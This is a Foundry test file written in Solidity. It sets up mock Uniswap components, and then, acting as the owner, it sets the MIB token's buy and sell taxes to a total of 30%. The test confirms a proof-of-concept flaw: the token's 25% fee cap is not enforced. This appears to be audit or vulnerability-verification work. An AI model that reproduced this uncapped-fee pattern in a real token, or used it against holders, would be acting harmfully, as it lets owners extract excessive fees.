// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MIB.sol";

contract MockWETH {
    function approve(address, uint256) public pure returns (bool) { return true; }
    function transfer(address, uint256) public pure returns (bool) { return true; }
    function deposit() public payable {}
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;
    
    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint, uint, uint) {
        return (amountTokenDesired, msg.value, 1);
    }
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external {}
}

contract MockFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair) {
        pair = address(new MockPair());
    }
}

contract MockPair {
    uint112 private reserve0;
    uint112 private reserve1;
    
    function sync() external {
        reserve0 = uint112(address(this).balance);
        reserve1 = uint112(address(this).balance);
    }
    
    function token0() external pure returns (address) { return address(0); }
    function token1() external pure returns (address) { return address(0); }
    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }
}

contract MIB_Fee_Test is Test {
    MIB token;
    address owner = address(0x1);
    address user = address(0x2);
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Setup mocked uniswap components
        MockWETH weth = new MockWETH();
        MockFactory factory = new MockFactory();
        MockRouter mockRouter = new MockRouter(address(factory), address(weth));
        
        // Deploy router simulation at fixed address
        vm.etch(routerAddress, address(mockRouter).code);
        vm.store(
            routerAddress,
            bytes32(0),
            bytes32(uint256(uint160(address(factory))))
        );
        vm.store(
            routerAddress,
            bytes32(uint256(1)),
            bytes32(uint256(uint160(address(weth))))
        );

        // Deploy token contract
        token = new MIB();
        token.transferOwnership(owner);
    }

    function test_FeeManipulation() public {
        console.log("--- BEFORE-Trigger Tax Settings ---");
        // Query initial buy tax state
        uint256 initialBuyLiquidity = token._buyLiquidityFee();
        uint256 initialBuyMarketing = token._buyMarketingFee();
        uint256 initialBuyTeam = token._buyTeamFee();
        uint256 initialTotalBuy = token._totalTaxIfBuying();
        
        // Query initial sell tax state
        uint256 initialSellLiquidity = token._sellLiquidityFee();
        uint256 initialSellMarketing = token._sellMarketingFee();
        uint256 initialSellTeam = token._sellTeamFee();
        uint256 initialTotalSell = token._totalTaxIfSelling();
        
        console.log("Initial Buy Taxes");
        console.log("  Liquidity: ", initialBuyLiquidity);
        console.log("  Marketing: ", initialBuyMarketing);
        console.log("  Team:      ", initialBuyTeam);
        console.log("  Total:     ", initialTotalBuy);
        console.log("Initial Sell Taxes");
        console.log("  Liquidity: ", initialSellLiquidity);
        console.log("  Marketing: ", initialSellMarketing);
        console.log("  Team:      ", initialSellTeam);
        console.log("  Total:     ", initialTotalSell);

        console.log("--- Trigger setTaxes (Exceed 25%% Limit) ---");
        vm.startPrank(owner);
        token.setBuyTaxes(10, 10, 10);
        token.setSelTaxes(10, 10, 10);
        vm.stopPrank();

        console.log("--- AFTER-Trigger Tax Settings ---");
        // Query post-manipulation buy tax state
        uint256 finalBuyLiquidity = token._buyLiquidityFee();
        uint256 finalBuyMarketing = token._buyMarketingFee();
        uint256 finalBuyTeam = token._buyTeamFee();
        uint256 finalTotalBuy = token._totalTaxIfBuying();
        
        // Query post-manipulation sell tax state
        uint256 finalSellLiquidity = token._sellLiquidityFee();
        uint256 finalSellMarketing = token._sellMarketingFee();
        uint256 finalSellTeam = token._sellTeamFee();
        uint256 finalTotalSell = token._totalTaxIfSelling();
        
        console.log("Final Buy Taxes");
        console.log("  Liquidity: ", finalBuyLiquidity);
        console.log("  Marketing: ", finalBuyMarketing);
        console.log("  Team:      ", finalBuyTeam);
        console.log("  Total:     ", finalTotalBuy);
        console.log("Final Sell Taxes");
        console.log("  Liquidity: ", finalSellLiquidity);
        console.log("  Marketing: ", finalSellMarketing);
        console.log("  Team:      ", finalSellTeam);
        console.log("  Total:     ", finalTotalSell);

        // Vulnerability verification
        bool exploitSuccess = (finalTotalBuy > 25 || finalTotalSell > 25);
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Tax rates exceed 25%% limit");
        } else {
            console.log("Vulnerability not Exist: Tax rates within 25%% limit");
        }
        
        // Final verdict with require - will show error if test fails
        require(exploitSuccess, "Vulnerability not exploited: tax rates remained within limits");
    }
}